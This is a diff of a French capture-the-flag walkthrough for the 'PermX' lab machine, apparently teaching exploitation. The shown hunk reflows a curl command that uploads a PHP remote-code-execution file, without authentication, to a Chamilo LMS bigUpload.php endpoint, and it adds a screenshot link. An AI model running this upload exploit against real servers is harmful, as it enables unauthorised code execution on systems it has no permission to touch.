@@ -821,8 +821,7 @@ Ce fichier contient une instruction PHP qui exécute la commande `id`, suffisant
 Tu uploades ensuite ce fichier à l’aide d’une requête `curl -F`, en utilisant le champ `bigUploadFile` attendu par l’application. L’option `@rce.php` indique à `curl` d’envoyer le contenu du fichier, comme lors d’un upload via un formulaire web.
 
 ```bash
-curl -F 'bigUploadFile=@rce.php' \
-'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
 ```
 
 ```bash
@@ -832,6 +831,8 @@ The file has successfully been uploaded.
 
 
 Le message *“The file has successfully been uploaded.”* confirme que le serveur accepte l’upload sans authentification et sans filtrage sur l’extension du fichier.
+
+![/main/inc/lib/javascript/bigupload/files](bigupload-files.png)
 
 Une fois l’upload effectué, tu accèdes directement au fichier PHP via son emplacement dans le répertoire d’upload, accessible depuis le navigateur.
 
